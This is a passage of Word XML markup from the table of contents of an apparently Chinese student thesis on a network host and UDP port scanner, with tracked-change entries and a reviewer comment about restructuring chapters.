            <w:noProof/>
          </w:rPr>
          <w:instrText>HYPERLINK \l "_Toc482522646"</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程序实现(流程图属设计吧。不要引用大量代码，只引用部分关键代码。把这部分合并到第4章吧。参考张海阳的)</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc482522646 \h </w:instrText>
        </w:r>
      </w:ins>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:ins w:id="194" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>25</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="2B111764" w14:textId="40C4806A" w:rsidR="002C4A81" w:rsidRDefault="002C4A81">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1050"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="480"/>
        <w:rPr>
          <w:ins w:id="195" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="196" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:instrText xml:space="preserve"> </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:instrText>HYPERLINK \l "_Toc482522647"</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5.1</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="21"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
            <w:b/>
            <w:noProof/>
          </w:rPr>
          <w:t>主机扫描</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc482522647 \h </w:instrText>
        </w:r>
      </w:ins>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:ins w:id="197" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>25</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="49BB319E" w14:textId="20392CC6" w:rsidR="002C4A81" w:rsidRDefault="002C4A81">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1680"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="960"/>
        <w:rPr>
          <w:ins w:id="198" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="199" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:instrText xml:space="preserve"> </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:instrText>HYPERLINK \l "_Toc482522648"</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5.1.1</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="21"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
            <w:b/>
            <w:noProof/>
          </w:rPr>
          <w:t>hostScan函数</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc482522648 \h </w:instrText>
        </w:r>
      </w:ins>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:ins w:id="200" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>25</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="2D6B4F85" w14:textId="1015AFE8" w:rsidR="002C4A81" w:rsidRDefault="002C4A81">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1680"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="960"/>
        <w:rPr>
          <w:ins w:id="201" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="202" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:instrText xml:space="preserve"> </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:instrText>HYPERLINK \l "_Toc482522649"</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5.1.2</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="21"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
            <w:b/>
            <w:noProof/>
          </w:rPr>
          <w:t>ping函数</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc482522649 \h </w:instrText>
        </w:r>
      </w:ins>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:ins w:id="203" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>26</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="08D661FC" w14:textId="1D795E69" w:rsidR="002C4A81" w:rsidRDefault="002C4A81">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1050"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="480"/>
        <w:rPr>
          <w:ins w:id="204" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="205" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:instrText xml:space="preserve"> </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:instrText>HYPERLINK \l "_Toc482522650"</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5.2</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="21"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
            <w:b/>
            <w:noProof/>
          </w:rPr>
          <w:t>UDP端口扫描</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc482522650 \h </w:instrText>
        </w:r>
      </w:ins>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:ins w:id="206" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>31</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="2379AAA9" w14:textId="19091205" w:rsidR="002C4A81" w:rsidRDefault="002C4A81">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1680"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="960"/>
        <w:rPr>
          <w:ins w:id="207" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="208" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:instrText xml:space="preserve"> </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:instrText>HYPERLINK \l "_Toc482522651"</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5.2.1</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="21"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
            <w:b/>
            <w:noProof/>
          </w:rPr>
          <w:t>网卡选择</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc482522651 \h </w:instrText>
        </w:r>
      </w:ins>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:ins w:id="209" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>31</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="0D94CC05" w14:textId="0F4BE14B" w:rsidR="002C4A81" w:rsidRDefault="002C4A81">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1680"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="960"/>
        <w:rPr>
          <w:ins w:id="210" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="211" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:instrText xml:space="preserve"> </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:instrText>HYPERLINK \l "_Toc482522652"</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5.2.2</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="21"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
            <w:b/>
            <w:noProof/>
          </w:rPr>
          <w:t>网卡信息获取</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc482522652 \h </w:instrText>
        </w:r>
      </w:ins>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:ins w:id="212" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>31</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="20639F41" w14:textId="038F551D" w:rsidR="002C4A81" w:rsidRDefault="002C4A81">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1680"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="960"/>
        <w:rPr>
          <w:ins w:id="213" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="214" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:instrText xml:space="preserve"> </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:instrText>HYPERLINK \l "_Toc482522653"</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5.2.3</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="21"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
            <w:b/>
            <w:noProof/>
          </w:rPr>
          <w:t>数据包的捕获</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc482522653 \h </w:instrText>
        </w:r>
      </w:ins>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:ins w:id="215" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>32</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="28E14660" w14:textId="1BF122DF" w:rsidR="002C4A81" w:rsidRDefault="002C4A81">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1680"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="960"/>
        <w:rPr>
          <w:ins w:id="216" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="217" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:instrText xml:space="preserve"> </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:instrText>HYPERLINK \l "_Toc482522654"</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5.2.4</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="21"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
            <w:b/>
            <w:noProof/>
          </w:rPr>
          <w:t>MAC地址获取</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc482522654 \h </w:instrText>
        </w:r>
      </w:ins>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:webHidden/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:ins w:id="218" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>34</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="65558878" w14:textId="2AB4AF35" w:rsidR="002C4A81" w:rsidRDefault="002C4A81">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1680"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="960"/>
        <w:rPr>
          <w:ins w:id="219" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="220" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:noProof/>
          </w:rPr>
          <w:instrText xml:space="preserve"> </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:instrText>HYPERLINK \l "_Toc482522655"</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5.2.5</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="21"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="008E292A">
          <w:rPr>
            <w:rStyle w:val="a8"/>
            <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
            <w:b/>
            <w:noProof/>
          </w:rPr>
          <w:t>数据包的构建</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
